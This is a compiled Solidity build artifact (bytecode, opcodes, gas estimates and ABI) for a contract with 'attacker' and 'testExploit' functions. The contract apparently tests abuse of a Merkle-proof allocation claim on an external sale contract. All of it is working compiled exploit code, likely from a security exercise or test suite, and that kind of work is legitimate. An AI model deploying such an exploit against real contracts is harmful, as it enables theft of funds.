{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040525f80546001600160a01b03191630179055348015601f575f5ffd5b506103c18061002d5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c806348eb76ee1461004e57806356c3bde81461007d5780635ef2152914610092578063889646ea14610107575b5f5ffd5b5f54610060906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61009061008b3660046101e3565b610117565b005b6100f96100a0366004610264565b604080516001600160a01b03841660208201529081018290525f9060600160408051601f198184030181528282528051602091820120908301520160405160208183030381529060405280519060200120905092915050565b604051908152602001610074565b6100f9683635c9adc5dea0000081565b6040805160e0810182524267ffffffffffffffff1681525f60208201819052818301819052606082018190526080820181905260a082015261271060c082015290516301cf242d60e51b81528491906001600160a01b038316906339e485a09061019490683635c9adc5dea00000908590899089906004016102bc565b5f604051808303815f87803b1580156101ab575f5ffd5b505af11580156101bd573d5f5f3e3d5ffd5b505050505050505050565b80356001600160a01b03811681146101de575f5ffd5b919050565b5f5f5f604084860312156101f5575f5ffd5b6101fe846101c8565b9250602084013567ffffffffffffffff811115610219575f5ffd5b8401601f81018613610229575f5ffd5b803567ffffffffffffffff81111561023f575f5ffd5b8660208260051b8401011115610253575f5ffd5b939660209190910195509293505050565b5f5f60408385031215610275575f5ffd5b61027e836101c8565b946020939093013593505050565b8183525f6001600160fb1b038311156102a3575f5ffd5b8260051b80836020870137939093016020019392505050565b84815267ffffffffffffffff845116602082015267ffffffffffffffff602085015116604082015267ffffffffffffffff60408501511660608201525f60608501516002811061031a57634e487b7160e01b5f52602160045260245ffd5b80608084015250608085015161033c60a084018267ffffffffffffffff169052565b5060a085015167ffffffffffffffff811660c08401525060c085015167ffffffffffffffff811660e0840152506101206101008301526103816101208301848661028c565b969550505050505056fea2646970667358221220a0dd5bc732c4817f436a35b5a51c5a919b317d1e5305d50830b541b9de5f0a1164736f6c634300081e0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND ADDRESS OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0x1F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x3C1 DUP1 PUSH2 0x2D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4A JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x56C3BDE8 EQ PUSH2 0x7D JUMPI DUP1 PUSH4 0x5EF21529 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x889646EA EQ PUSH2 0x107 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 SLOAD PUSH2 0x60 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x90 PUSH2 0x8B CALLDATASIZE PUSH1 0x4 PUSH2 0x1E3 JUMP JUMPDEST PUSH2 0x117 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF9 PUSH2 0xA0 CALLDATASIZE PUSH1 0x4 PUSH2 0x264 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x20 DUP3 ADD MSTORE SWAP1 DUP2 ADD DUP3 SWAP1 MSTORE PUSH0 SWAP1 PUSH1 0x60 ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE DUP3 DUP3 MSTORE DUP1 MLOAD PUSH1 0x20 SWAP2 DUP3 ADD KECCAK256 SWAP1 DUP4 ADD MSTORE ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x74 JUMP JUMPDEST PUSH2 0xF9 PUSH9 0x3635C9ADC5DEA00000 DUP2 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xE0 DUP2 ADD DUP3 MSTORE TIMESTAMP PUSH8 0xFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH0 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE DUP2 DUP4 ADD DUP2 SWAP1 MSTORE PUSH1 0x60 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x80 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0xA0 DUP3 ADD MSTORE PUSH2 0x2710 PUSH1 0xC0 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x1CF242D PUSH1 0xE5 SHL DUP2 MSTORE DUP5 SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND SWAP1 PUSH4 0x39E485A0 SWAP1 PUSH2 0x194 SWAP1 PUSH9 0x3635C9ADC5DEA00000 SWAP1 DUP6 SWAP1 DUP10 SWAP1 DUP10 SWAP1 PUSH1 0x4 ADD PUSH2 0x2BC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1AB JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1BD JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x1DE JUMPI PUSH0 PUSH0 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH1 0x40 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1F5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x1FE DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP5 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x219 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP5 ADD PUSH1 0x1F DUP2 ADD DUP7 SGT PUSH2 0x229 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x23F JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP7 PUSH1 0x20 DUP3 PUSH1 0x5 SHL DUP5 ADD ADD GT ISZERO PUSH2 0x253 JUMPI PUSH0 PUSH0 REVERT JUMPDEST SWAP4 SWAP7 PUSH1 0x20 SWAP2 SWAP1 SWAP2 ADD SWAP6 POP SWAP3 SWAP4 POP POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x275 JUMPI PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x27E DUP4 PUSH2 0x1C8 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST DUP2 DUP4 MSTORE PUSH0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xFB SHL SUB DUP4 GT ISZERO PUSH2 0x2A3 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP3 PUSH1 0x5 SHL DUP1 DUP4 PUSH1 0x20 DUP8 ADD CALLDATACOPY SWAP4 SWAP1 SWAP4 ADD PUSH1 0x20 ADD SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE PUSH8 0xFFFFFFFFFFFFFFFF DUP5 MLOAD AND PUSH1 0x20 DUP3 ADD MSTORE PUSH8 0xFFFFFFFFFFFFFFFF PUSH1 0x20 DUP6 ADD MLOAD AND PUSH1 0x40 DUP3 ADD MSTORE PUSH8 0xFFFFFFFFFFFFFFFF PUSH1 0x40 DUP6 ADD MLOAD AND PUSH1 0x60 DUP3 ADD MSTORE PUSH0 PUSH1 0x60 DUP6 ADD MLOAD PUSH1 0x2 DUP2 LT PUSH2 0x31A JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x80 DUP5 ADD MSTORE POP PUSH1 0x80 DUP6 ADD MLOAD PUSH2 0x33C PUSH1 0xA0 DUP5 ADD DUP3 PUSH8 0xFFFFFFFFFFFFFFFF AND SWAP1 MSTORE JUMP JUMPDEST POP PUSH1 0xA0 DUP6 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 AND PUSH1 0xC0 DUP5 ADD MSTORE POP PUSH1 0xC0 DUP6 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 AND PUSH1 0xE0 DUP5 ADD MSTORE POP PUSH2 0x120 PUSH2 0x100 DUP4 ADD MSTORE PUSH2 0x381 PUSH2 0x120 DUP4 ADD DUP5 DUP7 PUSH2 0x28C JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG0 0xDD JUMPDEST 0xC7 ORIGIN 0xC4 DUP2 PUSH32 0x436A35B5A51C5A919B317D1E5305D50830B541B9DE5F0A1164736F6C63430008 0x1E STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "192200",
				"executionCost": "24470",
				"totalCost": "216670"
			},
			"external": {
				"ALLOCATION()": "238",
				"attacker()": "2302",
				"getLeafHash(address,uint256)": "692",
				"testExploit(address,bytes32[])": "infinite"
			}
		},
		"methodIdentifiers": {
			"ALLOCATION()": "889646ea",
			"attacker()": "48eb76ee",
			"getLeafHash(address,uint256)": "5ef21529",
			"testExploit(address,bytes32[])": "56c3bde8"
		}
	},
	"abi": [
		{
			"inputs": [],
			"name": "ALLOCATION",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attacker",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_user",
					"type": "address"
				},
				{
					"internalType": "uint256",
					"name": "_amount",
					"type": "uint256"
				}
			],
			"name": "getLeafHash",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "pure",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "saleAddr",
					"type": "address"
				},
				{
					"internalType": "bytes32[]",
					"name": "proof",
					"type": "bytes32[]"
				}
			],
			"name": "testExploit",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}